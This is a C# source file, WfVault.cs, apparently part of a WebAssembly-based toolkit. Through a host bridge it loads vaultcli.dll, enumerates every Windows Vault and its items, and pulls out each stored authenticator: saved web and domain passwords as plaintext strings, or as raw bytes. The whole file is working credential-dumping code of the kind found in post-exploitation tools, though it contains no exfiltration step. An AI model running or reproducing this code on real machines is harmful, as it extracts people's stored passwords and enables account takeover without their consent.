// WfVault.cs — managed helpers for vaultcli.dll (Windows Vault enumeration).
//
// Mirrors the WfNetapi pattern: Resolve→Invoke→CopyHostToWasm against the
// host-side mod_load/mod_resolve/mod_invoke bridge. Reading host-allocated
// VAULT_ITEM_* structs requires copying their bytes into WASM memory first
// (Marshal.PtrToStructure assumes the IntPtr is addressable in the current
// process — false on wasm32, where IntPtr is 4 bytes).
//
// The high-level EnumerateAll() returns parsed entries so the consumer
// (WindowsVaultCommand) can keep its DTO shape without dealing with host
// pointers directly.

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace WasmForge.Helpers
{
    public static unsafe class WfVault
    {
        [DllImport("env", EntryPoint = "mod_load")]
        private static extern uint mod_load(uint namePtr);

        [DllImport("env", EntryPoint = "mod_resolve")]
        private static extern uint mod_resolve(uint libHandle, uint namePtr);

        [DllImport("env", EntryPoint = "mod_invoke")]
        private static extern ulong mod_invoke(
            ulong procHandle, uint nargs,
            ulong a0, ulong a1, ulong a2, ulong a3,
            ulong a4, ulong a5, ulong a6, ulong a7,
            ulong a8, ulong a9, ulong a10, ulong a11,
            ulong a12, ulong a13, ulong a14,
            ulong ret1Ptr, ulong errPtr);

        // ── Cached library + proc handles ───────────────────────────────
        private static uint _vaultcli;
        private static uint _hEnumerateVaults;
        private static uint _hOpenVault;
        private static uint _hEnumerateItems;
        private static uint _hGetItemWin8;
        private static uint _hGetItemWin7;
        private static uint _hCloseVault;
        private static uint _hVaultFree;
        private static uint _ntdll;
        private static uint _hRtlMoveMemory;
        private static uint _advapi32;
        private static uint _hConvertSidToStringSidW;
        private static uint _kernel32;
        private static uint _hLocalFree;

        private static uint Resolve(string dll, ref uint cachedLib, string fn, ref uint cachedProc)
        {
            if (cachedProc != 0) return cachedProc;
            if (cachedLib == 0)
            {
                byte[] db = Encoding.ASCII.GetBytes(dll + "\0");
                fixed (byte* dp = db) cachedLib = mod_load((uint)(IntPtr)dp);
                if (cachedLib == 0) return 0;
            }
            byte[] fb = Encoding.ASCII.GetBytes(fn + "\0");
            fixed (byte* fp = fb) cachedProc = mod_resolve(cachedLib, (uint)(IntPtr)fp);
            return cachedProc;
        }

        private static uint Invoke(uint proc, uint nargs,
            ulong a0 = 0, ulong a1 = 0, ulong a2 = 0, ulong a3 = 0,
            ulong a4 = 0, ulong a5 = 0, ulong a6 = 0, ulong a7 = 0)
        {
            ulong ret1 = 0, err = 0;
            ulong r0 = mod_invoke((ulong)proc, nargs,
                a0, a1, a2, a3, a4, a5, a6, a7, 0, 0, 0, 0, 0, 0, 0,
                (ulong)(uint)(IntPtr)(&ret1),
                (ulong)(uint)(IntPtr)(&err));
            return (uint)r0;
        }

        private static bool CopyHostToWasm(ulong hostAddr, uint wasmPtr, uint len)
        {
            if (hostAddr == 0 || wasmPtr == 0 || len == 0) return false;
            uint pCopy = Resolve("ntdll.dll", ref _ntdll, "RtlMoveMemory", ref _hRtlMoveMemory);
            if (pCopy == 0) return false;
            Invoke(pCopy, 3, (ulong)wasmPtr, hostAddr, (ulong)len);
            return true;
        }

        private static ulong Read8(byte* p, int off)
        {
            return ((ulong)p[off+0])       | ((ulong)p[off+1] <<  8) |
                   ((ulong)p[off+2] << 16) | ((ulong)p[off+3] << 24) |
                   ((ulong)p[off+4] << 32) | ((ulong)p[off+5] << 40) |
                   ((ulong)p[off+6] << 48) | ((ulong)p[off+7] << 56);
        }

        private static uint Read4(byte* p, int off)
        {
            return (uint)(p[off+0] | (p[off+1] << 8) | (p[off+2] << 16) | (p[off+3] << 24));
        }

        private static string ReadWStringFromHost(ulong hostAddr, int maxChars)
        {
            if (hostAddr == 0 || maxChars <= 0) return "";
            byte[] buf = new byte[maxChars * 2];
            fixed (byte* bp = buf)
            {
                if (!CopyHostToWasm(hostAddr, (uint)(IntPtr)bp, (uint)buf.Length)) return "";
            }
            int charLen = 0;
            for (int i = 0; i < maxChars; i++)
            {
                if (buf[2*i] == 0 && buf[2*i + 1] == 0) break;
                charLen++;
            }
            if (charLen == 0) return "";
            char[] chars = new char[charLen];
            for (int i = 0; i < charLen; i++)
                chars[i] = (char)(buf[2*i] | (buf[2*i + 1] << 8));
            return new string(chars);
        }

        private static Guid ReadGuidFromHost(ulong hostAddr)
        {
            if (hostAddr == 0) return Guid.Empty;
            byte[] buf = new byte[16];
            fixed (byte* bp = buf)
            {
                if (!CopyHostToWasm(hostAddr, (uint)(IntPtr)bp, 16)) return Guid.Empty;
            }
            return new Guid(buf);
        }

        private static Guid ReadGuidInline(byte* p, int off)
        {
            byte[] g = new byte[16];
            for (int i = 0; i < 16; i++) g[i] = p[off + i];
            return new Guid(g);
        }

        // ── Public data types ───────────────────────────────────────────

        public class VaultEntryData
        {
            public Guid SchemaGuid;
            public string? Resource;
            public string? Identity;
            public string? PackageSid;
            public string? CredentialString;   // when authenticator is a UTF-16 string
            public byte[]? CredentialBytes;    // when authenticator is a byte array
            public DateTime LastModifiedUtc;
        }

        public class VaultData
        {
            public Guid VaultGuid;
            public List<VaultEntryData> Entries = new List<VaultEntryData>();
        }

        // ── High-level enumeration ──────────────────────────────────────

        public static List<VaultData> EnumerateAll()
        {
            var results = new List<VaultData>();

            uint pEnumV  = Resolve("vaultcli.dll", ref _vaultcli, "VaultEnumerateVaults",  ref _hEnumerateVaults);
            uint pOpen   = Resolve("vaultcli.dll", ref _vaultcli, "VaultOpenVault",         ref _hOpenVault);
            uint pEnumI  = Resolve("vaultcli.dll", ref _vaultcli, "VaultEnumerateItems",    ref _hEnumerateItems);
            uint pClose  = Resolve("vaultcli.dll", ref _vaultcli, "VaultCloseVault",        ref _hCloseVault);
            uint pFree   = Resolve("vaultcli.dll", ref _vaultcli, "VaultFree",              ref _hVaultFree);
            uint pGetW8  = Resolve("vaultcli.dll", ref _vaultcli, "VaultGetItem",           ref _hGetItemWin8);
            // WIN7 entry point is the same export, just a different arg count
            _hGetItemWin7 = _hGetItemWin8;
            if (pEnumV == 0 || pOpen == 0 || pEnumI == 0) return results;

            bool isWin8 = Environment.OSVersion.Version > new Version("6.2");
            int vaultItemSize = isWin8 ? 80 : 72;

            // Step 1: enumerate vault GUIDs.
            int vaultCount = 0;
            ulong vaultGuidArrayHost = 0;
            uint rc = Invoke(pEnumV, 3,
                0u,
                (ulong)(uint)(IntPtr)(&vaultCount),
                (ulong)(uint)(IntPtr)(&vaultGuidArrayHost));
            if (rc != 0 || vaultCount <= 0 || vaultGuidArrayHost == 0) return results;
            if (vaultCount > 64) vaultCount = 64; // sanity cap

            // Pull the GUID array into WASM memory.
            byte[] guidBuf = new byte[vaultCount * 16];
            fixed (byte* gp = guidBuf)
            {
                if (!CopyHostToWasm(vaultGuidArrayHost, (uint)(IntPtr)gp, (uint)guidBuf.Length))
                {
                    return results;
                }

                for (int i = 0; i < vaultCount; i++)
                {
                    Guid vaultGuid = ReadGuidInline(gp, i * 16);
                    var vd = new VaultData { VaultGuid = vaultGuid };

                    // Step 2: open the vault.
                    ulong vaultHandle = 0;
                    Guid gMut = vaultGuid;
                    uint openRc = Invoke(pOpen, 3,
                        (ulong)(uint)(IntPtr)(&gMut),
                        0u,
                        (ulong)(uint)(IntPtr)(&vaultHandle));
                    if (openRc != 0 || vaultHandle == 0)
                    {
                        results.Add(vd); // empty entries list — same shape as native on open-fail
                        continue;
                    }

                    // Step 3: enumerate items.
                    int itemCount = 0;
                    ulong itemArrayHost = 0;
                    uint itemRc = Invoke(pEnumI, 4,
                        vaultHandle,
                        512u, // chunkSize matches original
                        (ulong)(uint)(IntPtr)(&itemCount),
                        (ulong)(uint)(IntPtr)(&itemArrayHost));
                    if (itemRc == 0 && itemCount > 0 && itemArrayHost != 0)
                    {
                        if (itemCount > 4096) itemCount = 4096;
                        ParseVaultItems(vd, vaultHandle, itemArrayHost, itemCount, vaultItemSize, isWin8, pGetW8);
                    }

                    if (pClose != 0)
                    {
                        ulong vh = vaultHandle;
                        Invoke(pClose, 1, (ulong)(uint)(IntPtr)(&vh));
                    }

                    results.Add(vd);
                }
            }

            // VaultFree takes the buffer pointer directly (PVOID Buffer), not a
            // pointer-to-pointer — passing &vg would translate to a stack
            // address rather than the host buffer address. Reviewer-caught
            // bug; latent on lab box because vaultCount=0 short-circuits.
            if (pFree != 0) Invoke(pFree, 1, vaultGuidArrayHost);

            return results;
        }

        private static void ParseVaultItems(VaultData vd, ulong vaultHandle, ulong itemArrayHost,
                                            int itemCount, int vaultItemSize, bool isWin8, uint pGetItem)
        {
            byte[] items = new byte[itemCount * vaultItemSize];
            fixed (byte* ip = items)
            {
                if (!CopyHostToWasm(itemArrayHost, (uint)(IntPtr)ip, (uint)items.Length)) return;

                for (int j = 0; j < itemCount; j++)
                {
                    int b = j * vaultItemSize;
                    // VAULT_ITEM_WIN8 layout (x64):
                    //   0:  Guid SchemaId (16)
                    //   16: IntPtr pszCredentialFriendlyName (8)
                    //   24: IntPtr pResourceElement (8)
                    //   32: IntPtr pIdentityElement (8)
                    //   40: IntPtr pAuthenticatorElement (8)
                    //   48: IntPtr pPackageSid (8)           // win8+ only
                    //   56: ulong LastModified (8)
                    // WIN7 omits pPackageSid; LastModified is at offset 48.
                    Guid schemaId = ReadGuidInline(ip, b + 0);
                    ulong pResource     = Read8(ip, b + 24);
                    ulong pIdentity     = Read8(ip, b + 32);
                    ulong pAuth         = Read8(ip, b + 40);
                    ulong pPackageSid   = isWin8 ? Read8(ip, b + 48) : 0UL;
                    ulong lastModified  = isWin8 ? Read8(ip, b + 56) : Read8(ip, b + 48);

                    // VaultGetItem returns a pointer to a newly-allocated
                    // VAULT_ITEM_*. The pAuthenticatorElement field on the
                    // RETURNED item is populated; the input item's
                    // pAuthenticatorElement is typically null/stub.
                    ulong passwordItemPtr = 0;
                    Guid sidMut = schemaId;
                    uint getRc;
                    if (isWin8)
                    {
                        getRc = Invoke(pGetItem, 8,
                            vaultHandle,
                            (ulong)(uint)(IntPtr)(&sidMut),
                            pResource,
                            pIdentity,
                            pPackageSid,
                            0UL, // IntPtr.Zero
                            0UL, // arg6 = 0
                            (ulong)(uint)(IntPtr)(&passwordItemPtr));
                    }
                    else
                    {
                        getRc = Invoke(pGetItem, 7,
                            vaultHandle,
                            (ulong)(uint)(IntPtr)(&sidMut),
                            pResource,
                            pIdentity,
                            0UL,
                            0UL,
                            (ulong)(uint)(IntPtr)(&passwordItemPtr));
                    }

                    ulong pAuthFromReturned = 0;
                    if (getRc == 0 && passwordItemPtr != 0)
                    {
                        // Read the returned item's pAuthenticatorElement (same offset 40 on both layouts).
                        byte[] ret = new byte[vaultItemSize];
                        fixed (byte* rp = ret)
                        {
                            if (CopyHostToWasm(passwordItemPtr, (uint)(IntPtr)rp, (uint)ret.Length))
                            {
                                pAuthFromReturned = Read8(rp, 40);
                            }
                        }
                    }
                    if (pAuthFromReturned == 0) pAuthFromReturned = pAuth;

                    var entry = new VaultEntryData
                    {
                        SchemaGuid       = schemaId,
                        Resource         = pResource != 0 ? ReadVaultElementString(pResource) : null,
                        Identity         = pIdentity != 0 ? ReadVaultElementString(pIdentity) : null,
                        PackageSid       = pPackageSid != 0 ? ReadVaultElementSid(pPackageSid) : null,
                        LastModifiedUtc  = DateTime.FromFileTimeUtc((long)lastModified),
                    };

                    if (pAuthFromReturned != 0)
                    {
                        var (s, bytes) = ReadVaultElementAuth(pAuthFromReturned);
                        entry.CredentialString = s;
                        entry.CredentialBytes  = bytes;
                    }

                    vd.Entries.Add(entry);
                }
            }
        }

        // ── VAULT_ITEM_ELEMENT readers ──────────────────────────────────
        //
        // Layout (LayoutKind.Explicit, x64):
        //   0:  int SchemaElementId
        //   4:  (padding)
        //   8:  int Type            (VAULT_ELEMENT_TYPE enum)
        //   12: (padding)
        //   16: value union
        //
        //   String:    IntPtr at +16 → UTF-16 string in host memory
        //   Sid:       IntPtr at +16 → PSID in host memory
        //   ByteArray: { int Length @+16; IntPtr pData @+24 }

        private const int VAULT_ELEMENT_HEADER = 16;

        private static (int type, byte[] body)? ReadElementHeader(ulong hostPtr, int bodyLen)
        {
            byte[] buf = new byte[VAULT_ELEMENT_HEADER + bodyLen];
            fixed (byte* bp = buf)
            {
                if (!CopyHostToWasm(hostPtr, (uint)(IntPtr)bp, (uint)buf.Length)) return null;
            }
            int type = (int)((uint)buf[8] | ((uint)buf[9] << 8) | ((uint)buf[10] << 16) | ((uint)buf[11] << 24));
            return (type, buf);
        }

        private static string? ReadVaultElementString(ulong hostPtr)
        {
            var h = ReadElementHeader(hostPtr, 8);
            if (h == null) return null;
            // Type 7 = String; type 0 = Boolean (1 byte); fall through and best-effort.
            ulong strHost;
            fixed (byte* bp = h.Value.body) strHost = Read8(bp, VAULT_ELEMENT_HEADER);
            if (strHost == 0) return null;
            return ReadWStringFromHost(strHost, 1024);
        }

        private static string? ReadVaultElementSid(ulong hostPtr)
        {
            var h = ReadElementHeader(hostPtr, 8);
            if (h == null) return null;
            ulong sidHost;
            fixed (byte* bp = h.Value.body) sidHost = Read8(bp, VAULT_ELEMENT_HEADER);
            if (sidHost == 0) return null;

            uint pConv      = Resolve("advapi32.dll", ref _advapi32, "ConvertSidToStringSidW", ref _hConvertSidToStringSidW);
            uint pLocalFree = Resolve("kernel32.dll", ref _kernel32, "LocalFree",              ref _hLocalFree);
            if (pConv == 0) return null;

            ulong sidWPtr = 0;
            Invoke(pConv, 2, sidHost, (ulong)(uint)(IntPtr)(&sidWPtr));
            if (sidWPtr == 0) return null;
            string s = ReadWStringFromHost(sidWPtr, 256);
            if (pLocalFree != 0) Invoke(pLocalFree, 1, sidWPtr);
            return s;
        }

        // Authenticator element: usually String (web/domain passwords), occasionally ByteArray.
        // Returns (string, null) for String elements, (null, bytes) for ByteArray elements.
        private static (string? str, byte[]? bytes) ReadVaultElementAuth(ulong hostPtr)
        {
            var h = ReadElementHeader(hostPtr, 24);
            if (h == null) return (null, null);
            int type = h.Value.type;
            byte[] body = h.Value.body;

            switch (type)
            {
                case 7: // String
                {
                    ulong strHost;
                    fixed (byte* bp = body) strHost = Read8(bp, VAULT_ELEMENT_HEADER);
                    if (strHost == 0) return (null, null);
                    return (ReadWStringFromHost(strHost, 4096), null);
                }
                case 8: // ByteArray
                {
                    uint  byteLen;
                    ulong byteDataHost;
                    fixed (byte* bp = body)
                    {
                        byteLen      = Read4(bp, VAULT_ELEMENT_HEADER + 0);
                        byteDataHost = Read8(bp, VAULT_ELEMENT_HEADER + 8);
                    }
                    if (byteLen == 0 || byteDataHost == 0) return (null, new byte[0]);
                    if (byteLen > 65536) byteLen = 65536;
                    byte[] data = new byte[byteLen];
                    fixed (byte* dp = data) CopyHostToWasm(byteDataHost, (uint)(IntPtr)dp, byteLen);
                    return (null, data);
                }
                default:
                    return (null, null);
            }
        }
    }
}
